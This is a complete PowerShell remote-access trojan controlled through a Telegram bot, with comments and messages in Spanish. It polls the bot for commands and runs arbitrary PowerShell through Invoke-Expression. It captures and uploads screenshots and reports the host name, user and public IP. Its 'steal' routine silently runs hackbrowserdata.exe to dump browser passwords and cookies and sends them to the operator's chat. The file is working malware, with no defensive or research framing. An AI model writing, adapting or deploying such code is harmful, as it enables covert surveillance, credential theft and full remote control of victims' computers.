param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

$ErrorActionPreference = 'Continue'
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = Join-Path $env:APPDATA 'CarpetaDos\bot.log'
$HackPath = Join-Path $env:APPDATA 'CarpetaDos\hackbrowserdata.exe'

# Crear directorio de logs
New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
    Write-Host $line
}

# Inicializar
Write-Log "=== BOT INICIADO ==="
Write-Log "Token: $($Token.Substring(0,10))..."
Write-Log "ChatId configurado: $ChatId"
Write-Log "HackBrowserData: $HackPath"

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

function Send-Message {
    param([string]$Text, [string]$ChatIdOverride = $ChatId)
    try {
        $body = @{chat_id=$ChatIdOverride; text=$Text} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType 'application/json' -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error enviando mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param([string]$Path, [string]$Caption="")
    try {
        if (-not (Test-Path $Path)) { return $false }
        $uri = "$ApiUrl/sendDocument"
        $form = @{chat_id=$ChatId; document=Get-Item $Path}
        if ($Caption) { $form.caption = $Caption }
        Invoke-RestMethod -Uri $uri -Method Post -Form $form | Out-Null
        return $true
    } catch {
        Write-Log "Error enviando archivo: $($_.Exception.Message)"
        return $false
    }
}

function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    return "PC: $env:COMPUTERNAME | Usuario: $env:USERNAME | IP: $ip"
}

function Take-Screenshot {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = Join-Path $env:TEMP "screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose(); $bitmap.Dispose()
        
        Send-File -Path $path -Caption "Screenshot $(Get-Date)"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        return $false
    }
}

function Run-Steal {
    param([string]$TargetChatId = $ChatId)
    
    Write-Log "Iniciando extraccion de navegadores..."
    Send-Message -Text "Extrayendo datos de navegadores..." -ChatIdOverride $TargetChatId
    
    # Verificar que existe hackbrowserdata
    if (-not (Test-Path $HackPath)) {
        Write-Log "ERROR: No se encuentra hackbrowserdata.exe en: $HackPath"
        Send-Message -Text "Error: No se encuentra hackbrowserdata.exe" -ChatIdOverride $TargetChatId
        return $false
    }
    
    $outputDir = Join-Path $env:TEMP "browser_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    
    try {
        # Comando correcto para v1.1.0: dump -d <dir> -f json --zip
        $args = "dump -d `"$outputDir`" -f json --zip"
        Write-Log "Ejecutando: hackbrowserdata.exe $args"
        
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $HackPath
        $psi.Arguments = $args
        $psi.WorkingDirectory = $outputDir
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.WaitForExit(120000)  # Timeout 2 minutos
        
        if (-not $proc.HasExited) {
            $proc.Kill()
            Write-Log "ERROR: Timeout ejecutando hackbrowserdata"
            Send-Message -Text "Error: Timeout esperando extraccion" -ChatIdOverride $TargetChatId
            return $false
        }
        
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        Write-Log "Exit code: $($proc.ExitCode)"
        Write-Log "Stdout: $stdout"
        if ($stderr) { Write-Log "Stderr: $stderr" }
        
        # Buscar archivos ZIP generados (v1.1.0 crea ZIP con --zip)
        $zipFiles = Get-ChildItem -Path $outputDir -Filter "*.zip" -ErrorAction SilentlyContinue
        $jsonFiles = Get-ChildItem -Path $outputDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        
        $sent = 0
        
        # Enviar ZIPs primero (preferido en v1.1.0)
        foreach ($zip in $zipFiles) {
            Write-Log "Enviando ZIP: $($zip.Name) ($($zip.Length) bytes)"
            if (Send-File -Path $zip.FullName -Caption "Datos: $($zip.Name)") {
                $sent++
            }
            Start-Sleep -Milliseconds 500
        }
        
        # Si no hay ZIPs, enviar JSONs individuales
        if ($sent -eq 0 -and $jsonFiles) {
            foreach ($json in $jsonFiles) {
                if ($json.Length -lt 49MB) {  # Limite de Telegram
                    Write-Log "Enviando JSON: $($json.Name)"
                    if (Send-File -Path $json.FullName -Caption $json.Name) {
                        $sent++
                    }
                    Start-Sleep -Milliseconds 300
                }
            }
        }
        
        if ($sent -eq 0) {
            Send-Message -Text "No se encontraron datos para extraer o los archivos son demasiado grandes." -ChatIdOverride $TargetChatId
        } else {
            Send-Message -Text "Extraccion completada. Archivos enviados: $sent" -ChatIdOverride $TargetChatId
        }
        
        # Limpiar
        Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
        
    } catch {
        Write-Log "ERROR en Run-Steal: $($_.Exception.Message)"
        Send-Message -Text "Error extrayendo datos: $($_.Exception.Message)" -ChatIdOverride $TargetChatId
    }
}

function Process-Command {
    param([string]$Text, [string]$FromChatId)
    
    Write-Log "Procesando comando: '$Text' desde chat: $FromChatId"
    
    $cmd = $Text.Trim().ToLower()
    
    switch -Regex ($cmd) {
        '^(ls|/ls)$' {
            try {
                $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio actual: $(Get-Location)`n`n$items"
            } catch {
                Send-Message -Text "Error: $($_.Exception.Message)"
            }
        }
        
        '^(cmd|/cmd)\s+(.+)' {
            $command = $Matches[2]
            Write-Log "Ejecutando: $command"
            try {
                $output = Invoke-Expression $command 2>&1 | Out-String
                if ($output.Length -gt 4000) { $output = $output.Substring(0, 4000) + "`n...(truncado)" }
                if ([string]::IsNullOrWhiteSpace($output)) { $output = "(Comando ejecutado sin salida)" }
                Send-Message -Text $output
            } catch {
                Send-Message -Text "Error ejecutando comando: $($_.Exception.Message)"
            }
        }
        
        '^(cd|/cd)\s+(.+)' {
            $path = $Matches[2]
            try {
                Set-Location $path -ErrorAction Stop
                Send-Message -Text "Directorio cambiado a: $(Get-Location)"
            } catch {
                Send-Message -Text "Error: No se pudo cambiar a '$path'"
            }
        }
        
        '^(pwd|/pwd)$' {
            Send-Message -Text "Directorio actual: $(Get-Location)"
        }
        
        '^(steal|/steal)$' {
            Run-Steal
        }
        
        '^(captura|/captura)$' {
            Send-Message -Text "Tomando screenshot..."
            if (-not (Take-Screenshot)) {
                Send-Message -Text "Error al tomar screenshot"
            }
        }
        
        '^(info|/info)$' {
            Send-Message -Text (Get-Info)
        }
        
        '^(help|/help)$' {
            $help = @'
Comandos disponibles:
/ls - Listar archivos
/cmd <comando> - Ejecutar comando PowerShell
/cd <ruta> - Cambiar directorio
/pwd - Mostrar directorio actual
/steal - Extraer datos de navegadores
/captura - Tomar screenshot
/info - Informacion del sistema
/help - Mostrar esta ayuda
'@
            Send-Message -Text $help
        }
        
        default {
            Write-Log "Comando no reconocido: $cmd"
        }
    }
}

# Bucle principal
Send-Message -Text "Bot iniciado - $(Get-Info)"
Write-Log "Entrando al bucle principal..."

$lastUpdateId = 0

while ($true) {
    try {
        $url = "$ApiUrl/getUpdates?offset=$($lastUpdateId + 1)&limit=10"
        $response = Invoke-RestMethod -Uri $url -TimeoutSec 60
        
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id
                $message = $update.message
                
                if ($null -eq $message) { continue }
                
                $msgChatId = [string]$message.chat.id
                $msgText = $message.text
                $msgFrom = $message.from.username
                
                Write-Log "Mensaje recibido - Chat: $msgChatId | De: $msgFrom | Texto: $msgText"
                
                # Verificar si es el chat correcto
                if ($msgChatId -eq $ChatId) {
                    if (-not [string]::IsNullOrWhiteSpace($msgText)) {
                        Process-Command -Text $msgText -FromChatId $msgChatId
                    }
                } else {
                    Write-Log "IGNORADO - Chat ID no coincide. Recibido: $msgChatId | Esperado: $ChatId"
                    # Descomenta la siguiente linea para aceptar cualquier chat (para pruebas)
                    # Process-Command -Text $msgText -FromChatId $msgChatId
                }
            }
        }
    } catch {
        Write-Log "Error en bucle: $($_.Exception.Message)"
        Start-Sleep -Seconds 5
    }
    
    Start-Sleep -Milliseconds 500
}
